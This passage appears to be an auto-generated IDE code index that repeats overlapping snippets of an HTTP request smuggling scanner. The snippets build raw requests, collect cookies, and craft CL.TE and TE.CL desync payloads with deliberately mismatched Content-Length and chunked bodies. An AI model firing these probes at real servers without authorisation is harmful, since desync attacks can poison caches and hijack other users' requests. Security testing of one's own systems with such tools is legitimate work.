        "peekOfCode": "\t\t\tp = Payload()\n\t\t\tp.host = self._host\n\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\t\t\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\t\t\tp.header += \"Content-Length: 0\" + RN\n\t\t\tp.body = \"\"",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tp.host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tp.host = self._host\n\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\t\t\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\t\t\tp.header += \"Content-Length: 0\" + RN\n\t\t\tp.body = \"\"\n\t\t\t#print (str(p))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tp.method",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tp.method = \"GET\"\n\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\t\t\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\t\t\tp.header += \"Content-Length: 0\" + RN\n\t\t\tp.body = \"\"\n\t\t\t#print (str(p))\n\t\t\tweb.send(str(p).encode())",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tp.endpoint",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tp.endpoint = self._endpoint\n\t\t\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t\t\tp.header += \"Host: __HOST__\" + RN\n\t\t\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\t\t\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\t\t\tp.header += \"Content-Length: 0\" + RN\n\t\t\tp.body = \"\"\n\t\t\t#print (str(p))\n\t\t\tweb.send(str(p).encode())\n\t\t\tsleep(0.5)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tp.body",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tp.body = \"\"\n\t\t\t#print (str(p))\n\t\t\tweb.send(str(p).encode())\n\t\t\tsleep(0.5)\n\t\t\tres = web.recv_nb(2.0)\n\t\t\tweb.close()\n\t\t\tif (res is not None):\n\t\t\t\tres = res.decode().split(\"\\r\\n\")\n\t\t\t\tfor elem in res:\n\t\t\t\t\tif len(elem) > 11:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tres",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tres = web.recv_nb(2.0)\n\t\t\tweb.close()\n\t\t\tif (res is not None):\n\t\t\t\tres = res.decode().split(\"\\r\\n\")\n\t\t\t\tfor elem in res:\n\t\t\t\t\tif len(elem) > 11:\n\t\t\t\t\t\tif elem[0:11].lower().replace(\" \", \"\") == \"set-cookie:\":\n\t\t\t\t\t\t\tcookie = elem.lower().replace(\"set-cookie:\",\"\")\n\t\t\t\t\t\t\tcookie = cookie.split(\";\")[0] + ';'\n\t\t\t\t\t\t\tcookies += [cookie]",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tres",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tres = res.decode().split(\"\\r\\n\")\n\t\t\t\tfor elem in res:\n\t\t\t\t\tif len(elem) > 11:\n\t\t\t\t\t\tif elem[0:11].lower().replace(\" \", \"\") == \"set-cookie:\":\n\t\t\t\t\t\t\tcookie = elem.lower().replace(\"set-cookie:\",\"\")\n\t\t\t\t\t\t\tcookie = cookie.split(\";\")[0] + ';'\n\t\t\t\t\t\t\tcookies += [cookie]\n\t\t\t\tinfo = ((Fore.CYAN + str(len(cookies))+ Fore.MAGENTA), self._logh)\n\t\t\t\tprint_info(\"Cookies    : %s (Appending to the attack)\" % (info[0]))\n\t\t\t\tself._cookies += cookies",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t\t\tcookie",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\t\t\tcookie = elem.lower().replace(\"set-cookie:\",\"\")\n\t\t\t\t\t\t\tcookie = cookie.split(\";\")[0] + ';'\n\t\t\t\t\t\t\tcookies += [cookie]\n\t\t\t\tinfo = ((Fore.CYAN + str(len(cookies))+ Fore.MAGENTA), self._logh)\n\t\t\t\tprint_info(\"Cookies    : %s (Appending to the attack)\" % (info[0]))\n\t\t\t\tself._cookies += cookies\n\t\t\treturn True\n\t\texcept Exception as exception_data:\n\t\t\terror = ((Fore.CYAN + \"Unable to connect to host\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t\t\t\tcookie",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\t\t\t\tcookie = cookie.split(\";\")[0] + ';'\n\t\t\t\t\t\t\tcookies += [cookie]\n\t\t\t\tinfo = ((Fore.CYAN + str(len(cookies))+ Fore.MAGENTA), self._logh)\n\t\t\t\tprint_info(\"Cookies    : %s (Appending to the attack)\" % (info[0]))\n\t\t\t\tself._cookies += cookies\n\t\t\treturn True\n\t\texcept Exception as exception_data:\n\t\t\terror = ((Fore.CYAN + \"Unable to connect to host\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\treturn False",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tinfo",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tinfo = ((Fore.CYAN + str(len(cookies))+ Fore.MAGENTA), self._logh)\n\t\t\t\tprint_info(\"Cookies    : %s (Appending to the attack)\" % (info[0]))\n\t\t\t\tself._cookies += cookies\n\t\t\treturn True\n\t\texcept Exception as exception_data:\n\t\t\terror = ((Fore.CYAN + \"Unable to connect to host\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\treturn False\n\tdef run(self):\n\t\tRN = \"\\r\\n\"",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\terror",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\terror = ((Fore.CYAN + \"Unable to connect to host\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\treturn False\n\tdef run(self):\n\t\tRN = \"\\r\\n\"\n\t\tmutations = {}\n\t\tif not self._get_cookies():\n\t\t\treturn\n\t\tif (self._configfile[1] != '/'):\n\t\t\tself._configfile = os.path.dirname(os.path.realpath(__file__)) + \"/configs/\" + self._configfile",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tRN",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tRN = \"\\r\\n\"\n\t\tmutations = {}\n\t\tif not self._get_cookies():\n\t\t\treturn\n\t\tif (self._configfile[1] != '/'):\n\t\t\tself._configfile = os.path.dirname(os.path.realpath(__file__)) + \"/configs/\" + self._configfile\n\t\ttry:\n\t\t\tf = open(self._configfile)\n\t\texcept:\n\t\t\terror = ((Fore.CYAN + \"Cannot find config file\"+ Fore.MAGENTA), self._logh)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tmutations",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tmutations = {}\n\t\tif not self._get_cookies():\n\t\t\treturn\n\t\tif (self._configfile[1] != '/'):\n\t\t\tself._configfile = os.path.dirname(os.path.realpath(__file__)) + \"/configs/\" + self._configfile\n\t\ttry:\n\t\t\tf = open(self._configfile)\n\t\texcept:\n\t\t\terror = ((Fore.CYAN + \"Cannot find config file\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tself._configfile",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tself._configfile = os.path.dirname(os.path.realpath(__file__)) + \"/configs/\" + self._configfile\n\t\ttry:\n\t\t\tf = open(self._configfile)\n\t\texcept:\n\t\t\terror = ((Fore.CYAN + \"Cannot find config file\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\texit(1)\n\t\tscript = f.read()\n\t\tf.close()\n\t\texec(script)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tf",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tf = open(self._configfile)\n\t\texcept:\n\t\t\terror = ((Fore.CYAN + \"Cannot find config file\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\texit(1)\n\t\tscript = f.read()\n\t\tf.close()\n\t\texec(script)\n\t\tfor mutation_name in mutations.keys():\n\t\t\tif self._create_exec_test(mutation_name, mutations[mutation_name]) and self._exit_early:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\terror",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\terror = ((Fore.CYAN + \"Cannot find config file\"+ Fore.MAGENTA), self._logh)\n\t\t\tprint_info(\"Error      : %s\" % (error[0]))\n\t\t\texit(1)\n\t\tscript = f.read()\n\t\tf.close()\n\t\texec(script)\n\t\tfor mutation_name in mutations.keys():\n\t\t\tif self._create_exec_test(mutation_name, mutations[mutation_name]) and self._exit_early:\n\t\t\t\tbreak\n\t\tif self._quiet:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tscript",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tscript = f.read()\n\t\tf.close()\n\t\texec(script)\n\t\tfor mutation_name in mutations.keys():\n\t\t\tif self._create_exec_test(mutation_name, mutations[mutation_name]) and self._exit_early:\n\t\t\t\tbreak\n\t\tif self._quiet:\n\t\t\tsys.stdout.write(\"\\r\"+\" \"*100+\"\\r\")\n\t# ptype == 0 (Attack payload, timeout could mean potential TECL desync)\n\t# ptype == 1 (Edgecase payload, expected to work)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload = deepcopy(payload)\n\t\tif (self._vhost == \"\"):\n\t\t\tte_payload.host = self._host\n\t\telse:\n\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.host = self._host\n\t\telse:\n\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 6 # timeout val == 6, good value == 5\n\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 6 # timeout val == 6, good value == 5\n\t\telse:\n\t\t\tte_payload.cl = 5 # timeout val == 6, good value == 5\n\t\tte_payload.body = EndChunk+\"X\"",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.method",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 6 # timeout val == 6, good value == 5\n\t\telse:\n\t\t\tte_payload.cl = 5 # timeout val == 6, good value == 5\n\t\tte_payload.body = EndChunk+\"X\"\n\t\t#print (te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.endpoint",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 6 # timeout val == 6, good value == 5\n\t\telse:\n\t\t\tte_payload.cl = 5 # timeout val == 6, good value == 5\n\t\tte_payload.body = EndChunk+\"X\"\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.cl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.cl = 6 # timeout val == 6, good value == 5\n\t\telse:\n\t\t\tte_payload.cl = 5 # timeout val == 6, good value == 5\n\t\tte_payload.body = EndChunk+\"X\"\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\t# ptype == 0 (timeout payload, timeout could mean potential CLTE desync)\n\t# ptype == 1 (Edgecase payload, expected to work)\n\tdef _check_clte(self, payload, ptype=0):\n\t\tte_payload = deepcopy(payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.cl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.cl = 5 # timeout val == 6, good value == 5\n\t\tte_payload.body = EndChunk+\"X\"\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\t# ptype == 0 (timeout payload, timeout could mean potential CLTE desync)\n\t# ptype == 1 (Edgecase payload, expected to work)\n\tdef _check_clte(self, payload, ptype=0):\n\t\tte_payload = deepcopy(payload)\n\t\tif (self._vhost == \"\"):\n\t\t\tte_payload.host = self._host",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.body",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.body = EndChunk+\"X\"\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\t# ptype == 0 (timeout payload, timeout could mean potential CLTE desync)\n\t# ptype == 1 (Edgecase payload, expected to work)\n\tdef _check_clte(self, payload, ptype=0):\n\t\tte_payload = deepcopy(payload)\n\t\tif (self._vhost == \"\"):\n\t\t\tte_payload.host = self._host\n\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload = deepcopy(payload)\n\t\tif (self._vhost == \"\"):\n\t\t\tte_payload.host = self._host\n\t\telse:\n\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.host = self._host\n\t\telse:\n\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 4 # timeout val == 4, good value == 11\n\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.host",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.host = self._vhost\n\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 4 # timeout val == 4, good value == 11\n\t\telse:\n\t\t\tte_payload.cl = 11 # timeout val == 4, good value == 11\n\t\tte_payload.body = Chunked(\"Z\")+EndChunk",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.method",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.method = self._method\n\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 4 # timeout val == 4, good value == 11\n\t\telse:\n\t\t\tte_payload.cl = 11 # timeout val == 4, good value == 11\n\t\tte_payload.body = Chunked(\"Z\")+EndChunk\n\t\t#print (te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.endpoint",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.endpoint = self._endpoint\n\t\tif len(self._cookies) > 0:\n\t\t\tte_payload.header += \"Cookie: \" + ''.join(self._cookies) + \"\\r\\n\"\n\t\tif not ptype:\n\t\t\tte_payload.cl = 4 # timeout val == 4, good value == 11\n\t\telse:\n\t\t\tte_payload.cl = 11 # timeout val == 4, good value == 11\n\t\tte_payload.body = Chunked(\"Z\")+EndChunk\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.cl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.cl = 4 # timeout val == 4, good value == 11\n\t\telse:\n\t\t\tte_payload.cl = 11 # timeout val == 4, good value == 11\n\t\tte_payload.body = Chunked(\"Z\")+EndChunk\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\tdef _create_exec_test(self, name, te_payload):\n\t\tdef pretty_print(name, dismsg):\n\t\t\tspacing = 13\n\t\t\tsys.stdout.write(\"\\r\"+\" \"*100+\"\\r\")",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tte_payload.cl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tte_payload.cl = 11 # timeout val == 4, good value == 11\n\t\tte_payload.body = Chunked(\"Z\")+EndChunk\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\tdef _create_exec_test(self, name, te_payload):\n\t\tdef pretty_print(name, dismsg):\n\t\t\tspacing = 13\n\t\t\tsys.stdout.write(\"\\r\"+\" \"*100+\"\\r\")\n\t\t\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s]%s: %s\" % \\\n\t\t\t(Fore.CYAN + name + Fore.MAGENTA, \" \"*(spacing-len(name)), dismsg)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\tte_payload.body",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\tte_payload.body = Chunked(\"Z\")+EndChunk\n\t\t#print (te_payload)\n\t\treturn self._test(te_payload)\n\tdef _create_exec_test(self, name, te_payload):\n\t\tdef pretty_print(name, dismsg):\n\t\t\tspacing = 13\n\t\t\tsys.stdout.write(\"\\r\"+\" \"*100+\"\\r\")\n\t\t\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s]%s: %s\" % \\\n\t\t\t(Fore.CYAN + name + Fore.MAGENTA, \" \"*(spacing-len(name)), dismsg)\n\t\t\tsys.stdout.write(CF(msg + Style.RESET_ALL))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tspacing",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tspacing = 13\n\t\t\tsys.stdout.write(\"\\r\"+\" \"*100+\"\\r\")\n\t\t\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s]%s: %s\" % \\\n\t\t\t(Fore.CYAN + name + Fore.MAGENTA, \" \"*(spacing-len(name)), dismsg)\n\t\t\tsys.stdout.write(CF(msg + Style.RESET_ALL))\n\t\t\tsys.stdout.flush()\n\t\t\tif dismsg[-1] == \"\\n\":\n\t\t\t\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\t\t\t\tplaintext = ansi_escape.sub('', msg)\n\t\t\t\tif self._logh is not None:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tmsg",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tmsg = Style.BRIGHT + Fore.MAGENTA + \"[%s]%s: %s\" % \\\n\t\t\t(Fore.CYAN + name + Fore.MAGENTA, \" \"*(spacing-len(name)), dismsg)\n\t\t\tsys.stdout.write(CF(msg + Style.RESET_ALL))\n\t\t\tsys.stdout.flush()\n\t\t\tif dismsg[-1] == \"\\n\":\n\t\t\t\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\t\t\t\tplaintext = ansi_escape.sub('', msg)\n\t\t\t\tif self._logh is not None:\n\t\t\t\t\tself._logh.write(plaintext)\n\t\t\t\t\tself._logh.flush()",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tansi_escape",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tansi_escape = re.compile(r'\\x1B[@-_][0-?]*[ -/]*[@-~]')\n\t\t\t\tplaintext = ansi_escape.sub('', msg)\n\t\t\t\tif self._logh is not None:\n\t\t\t\t\tself._logh.write(plaintext)\n\t\t\t\t\tself._logh.flush()\n\t\tdef write_payload(smhost, payload, ptype):\n\t\t\tfurl = smhost.replace('.', '_')\n\t\t\tif (self.ssl_flag):\n\t\t\t\tfurl = \"https_\" + furl\n\t\t\telse:",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tplaintext",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tplaintext = ansi_escape.sub('', msg)\n\t\t\t\tif self._logh is not None:\n\t\t\t\t\tself._logh.write(plaintext)\n\t\t\t\t\tself._logh.flush()\n\t\tdef write_payload(smhost, payload, ptype):\n\t\t\tfurl = smhost.replace('.', '_')\n\t\t\tif (self.ssl_flag):\n\t\t\t\tfurl = \"https_\" + furl\n\t\t\telse:\n\t\t\t\tfurl = \"http_\" + furl",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\tfurl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\tfurl = smhost.replace('.', '_')\n\t\t\tif (self.ssl_flag):\n\t\t\t\tfurl = \"https_\" + furl\n\t\t\telse:\n\t\t\t\tfurl = \"http_\" + furl\n\t\t\tif os.path.islink(sys.argv[0]):\n\t\t\t\t_me = os.readlink(sys.argv[0])\n\t\t\telse:\n\t\t\t\t_me = sys.argv[0]\n\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tfurl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tfurl = \"https_\" + furl\n\t\t\telse:\n\t\t\t\tfurl = \"http_\" + furl\n\t\t\tif os.path.islink(sys.argv[0]):\n\t\t\t\t_me = os.readlink(sys.argv[0])\n\t\t\telse:\n\t\t\t\t_me = sys.argv[0]\n\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)\n\t\t\tpretty_print(\"CRITICAL\", \"%s Payload: %s URL: %s\\n\" % \\\n\t\t\t(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tfurl",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
        "peekOfCode": "\t\t\t\tfurl = \"http_\" + furl\n\t\t\tif os.path.islink(sys.argv[0]):\n\t\t\t\t_me = os.readlink(sys.argv[0])\n\t\t\telse:\n\t\t\t\t_me = sys.argv[0]\n\t\t\tfname = os.path.realpath(os.path.dirname(_me)) + \"/payloads/%s_%s_%s.txt\" % (furl,ptype,name)\n\t\t\tpretty_print(\"CRITICAL\", \"%s Payload: %s URL: %s\\n\" % \\\n\t\t\t(Fore.MAGENTA+ptype, Fore.CYAN+fname+Fore.MAGENTA, Fore.CYAN+self._url))\n\t\t\twith open(fname, 'wb') as file:\n\t\t\t\tfile.write(bytes(str(payload),'utf-8'))",
        "detail": "tools.smuggler.smuggler",
        "documentation": {}
    },
    {
        "label": "\t\t\t\t_me",
        "kind": 5,
        "importPath": "tools.smuggler.smuggler",
        "description": "tools.smuggler.smuggler",
